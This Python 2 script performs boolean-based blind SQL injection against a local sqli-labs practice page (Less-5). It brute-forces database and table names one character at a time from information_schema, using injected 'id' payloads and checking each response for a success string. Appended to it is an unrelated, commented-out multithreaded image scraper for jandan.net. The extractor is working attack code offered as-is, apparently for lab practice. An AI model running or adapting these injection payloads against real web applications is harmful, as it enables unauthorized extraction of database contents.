# -*- coding:utf-8 -*-

import requests
import string

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
url = "http://127.0.0.1/sqli/Less-5/"

data = string.digits+string.lowercase

length = ""
def load(url):
	global length
	for j in range(1,10):
		for i in xrange(48,126):
			# response = requests.get(url+"?id=-1' || ascii(substr((select database() limit 0,1),{a},1))={b} %23".format(a=j,b=i),headers=header)
			response = requests.get(url+"?id=-1' || ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 3,1),{a},1))={b} %23".format(a=j,b=i),headers=header)
			response=response.text
			# sprint response
			if "You are in..........." in response:
				length = length+chr(i)
				print length
				break

load (url)

# -*- coding:utf-8 -*-
# import threading
# import time
# import requests
# import re
# from bs4 import BeautifulSoup
# import Queue
# import sys
# reload(sys)
# sys.setdefaultencoding( "utf-8" )

# url = 'http://jandan.net/pic/page-'

# class jandanspider(threading.Thread):
# 	def __init__(self,queue):
# 		threading.Thread.__init__(self)
# 		self._queue = queue

# 	def run(self):
# 		while not self._queue.empty():
# 			url = self._queue.get_nowait()
# 			self.spider(url)

# 	def spider(self,url):
# 		header = {'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'}
# 		response = requests.get(url,headers=header)
# 		# print response.content
# 		soup = BeautifulSoup(str(response.content),'lxml')
# 		imgs = soup.find_all(name='img',attrs={})
# 		for img in imgs:
# 			if 'onload' in img:
# 				print img['org_src']
# 			else:
# 				print img['src']	
# 		print time.ctime().split(' ')[3]

# def main():
# 	queue = Queue.Queue()
# 	for i in range(255,260):
# 		queue.put(url+str(i))

# 	threads = []

# 	for i in range(5):
# 		threads.append(jandanspider(queue))

# 	for i in threads:
# 		i.start()

# 	for i in threads:
# 		i.join()

# if __name__ == '__main__':
# 	main()

# print time.ctime()
# print time.ctime().split(' ')[3]